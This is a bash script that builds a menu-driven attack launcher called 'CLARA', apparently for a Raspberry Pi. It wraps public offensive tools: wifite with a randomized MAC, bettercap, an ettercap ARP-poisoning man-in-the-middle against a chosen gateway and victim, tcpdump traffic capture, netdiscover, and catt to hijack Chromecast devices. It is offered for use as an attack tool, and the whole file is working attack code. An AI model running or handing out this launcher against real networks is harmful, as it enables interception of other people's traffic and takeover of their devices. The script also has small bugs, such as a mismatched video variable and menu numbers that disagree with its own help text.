#!/bin/bash 
greet(){
NOW=$( date '+%F_%H:%M:%S' )

echo "CLARA is online v0.6"
sleep 1
echo "$NOW"
echo "Welcome to the CLARA network $USER" 
sleep 2
}



_info (){
    echo "  Hello $USER I am the Clever Little Automated Remote Attack or CLARA if you prefer here is a helpful mannual"
    sleep 1
    echo "
          1 sparrow-wifi spawns a sparrowwifiagent and you may connect to it on a sparrow-wifi instance:
          
          2 bettercap launches a bettercap shell
          
          3 wifite launches a wifite shell with the param --random-mac hard coded
          
          4 sniff automates a ettercap basic mitm attack 
          
          5 host discovery uses netdiscover to find hosts on a network
          
          6 dump uses tcppdump to dump all traffic on a network
          
          7 chrome cast uses catt to mess with chromecast devices
          
          8 python file server starts a python site where you can send files to the rpi
          
          9 spawn a shell spawns a shell on the rpi in bash  "
    main_menu
}


_spawn_shell() {
    echo "Spawning a shell."
    TERM=xterm bash
}

_sniffing() {
    echo "what is the gateway IP"
    read gateway
    echo "what is the device IP"
    read device
    sudo ettercap -T -S -i eth0 -M arp:remote /$gateway// /$device//
}


_Dump(){
    echo "interface?"
    read interface
    sudo tcpdump -i $interface 
}


_cast(){
    echo "device IP?"
    read ip
    echo "please supply the video"
    read Video
    sudo catt -d $ip cast $video
}

_wifite () {
    echo "choose the interface"
    read interface
    sudo wifite -i $interface --random-mac 
}


_roku_remote() {
    python3 remote_roku.py
}


main_menu() {
    echo "Select an attack:"
    echo "0 info"
    echo "1. sparrow-wifi"
    echo "2. bettercap"
    echo "3. wifite "
    echo "4. sniff "
    echo "5. hosts discovery"
    echo "6.Dump"
    echo "7.chrome cast hack"
    echo "8.roku remote"
    echo "9. python file server"
    echo "10.DEDTRACKER"
    echo "11. Spawn a shell (bash)"
    read -p "Enter your choice: " choice

    case $choice in
        0) _info;;
        1)sudo sparrowwifiagent ;;
        2)sudo bettercap ;;
        3)_wifite;;
        4)_sniffing ;;
        5)sudo netdiscover ;; 
        6)_Dump ;;
        7)_cast ;;
        8)_roku_remote;;
        9)python3 server.py;;
        10)sudo python3 DEDTRACKER.py;;
        11)_spawn_shell ;;
        *) echo "Invalid choice. Please select again." ;;
    esac
}
greet
main_menu
